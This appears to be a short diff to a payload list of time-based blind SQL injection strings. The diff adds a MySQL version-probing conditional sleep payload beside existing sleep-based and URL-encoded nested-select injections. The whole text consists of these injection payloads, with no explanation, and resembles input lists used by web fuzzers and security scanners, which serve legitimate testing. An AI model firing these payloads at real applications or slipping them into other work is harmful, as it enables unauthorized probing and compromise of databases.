@@ -1,2 +1,4 @@
 ';sleep(10000);
 '%2b(select*from(select(sleep(5)))a)%2b'
+"-IF(MID(@@version,1,1) = 5, sleep(10), "")-"
+
